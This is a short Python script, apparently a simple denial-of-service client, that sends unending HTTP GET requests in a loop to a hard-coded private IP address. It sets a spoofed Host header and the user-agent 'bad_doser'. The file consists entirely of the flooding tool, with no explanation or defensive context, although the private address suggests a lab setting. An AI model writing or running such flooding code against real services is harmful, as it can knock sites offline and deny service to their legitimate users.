import sys
import threading
import requests
import datetime
import time

url = "http://192.168.250.10:8080"

def request_dos():
    while True:
        try:
            headers = {"Host": "sitename.com", "User-agent": "bad_doser"}
            response = requests.get(url, headers=headers)
        except requests.exceptions.RequestException as e:
            print(f'Error: {e}')


if __name__ == "__main__":
    print(f"Client start send to {url}")

    try:
        thread = threading.Thread(target=request_dos)
        thread.start()
    except KeyboardInterrupt:
        # Ctrl+C will stop client
        print("Client stopped.")
        sys.exit()
